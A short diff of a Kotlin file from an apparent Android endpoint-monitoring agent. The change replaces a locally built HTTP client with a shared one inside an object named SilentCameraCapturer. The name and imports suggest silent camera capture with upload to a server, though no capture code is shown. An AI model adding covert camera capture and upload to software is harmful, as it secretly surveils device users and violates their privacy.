@@ -19,11 +19,11 @@ import android.os.PowerManager
 import android.util.Base64
 import android.util.Log
 import androidx.core.content.ContextCompat
+import com.edr.agent.network.EdrHttpClient
 import com.edr.agent.storage.EdrLocalStorage
 import com.edr.agent.storage.SyncPreferences
 import com.google.gson.Gson
 import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.File
@@ -42,11 +42,7 @@ object SilentCameraCapturer {
     private const val TAG = "SilentCameraCapturer"
     private val isBusy = AtomicBoolean(false)
 
-    private val httpClient = OkHttpClient.Builder()
-        .connectTimeout(15, TimeUnit.SECONDS)
-        .writeTimeout(30, TimeUnit.SECONDS)
-        .readTimeout(30, TimeUnit.SECONDS)
-        .build()
+    private val httpClient = EdrHttpClient.apiClient
 
     private val gson = Gson()
     private val jsonMediaType = "application/json; charset=utf-8".toMediaType()
